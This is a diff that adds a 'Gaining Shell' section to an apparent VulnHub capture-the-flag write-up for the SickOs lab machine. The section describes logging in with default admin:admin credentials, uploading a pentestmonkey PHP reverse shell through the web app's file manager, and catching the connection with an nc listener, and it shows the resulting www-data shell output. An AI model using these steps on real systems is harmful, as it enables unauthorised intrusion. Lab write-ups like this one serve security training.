@@ -85,9 +85,30 @@ just manually visited the url and i was redirected to a login page (i did not kn
 
 simply tried `admin:admin` and booom, i was in.
 
-looking at the result of the searchsploit for RCE [php/webapps/51421.txt](https://www.exploit-db.com/exploits/51421)
+## 3.Gaining Shell
 
+Looking at the result of the searchsploit for RCE [php/webapps/51421.txt](https://www.exploit-db.com/exploits/51421) i created a php reverse shell from pentestmonkey and put it
 
+in `Files` menu and `Create new file` saved it and located it in `/public` :
+
+![shell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/90440763-4b65-4ac5-a76f-18bc7133ef30)
+
+open the `shell.php` and prepare a listener on your kali machine, you will get the shell.
+
+```text
+root㉿kali:~# nc -nvlp 4444
+listening on [any] 4444 ...
+
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.229] 41750
+Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 22:03:28 up  2:01,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+## 4.Privilege Escalation
 
 
 
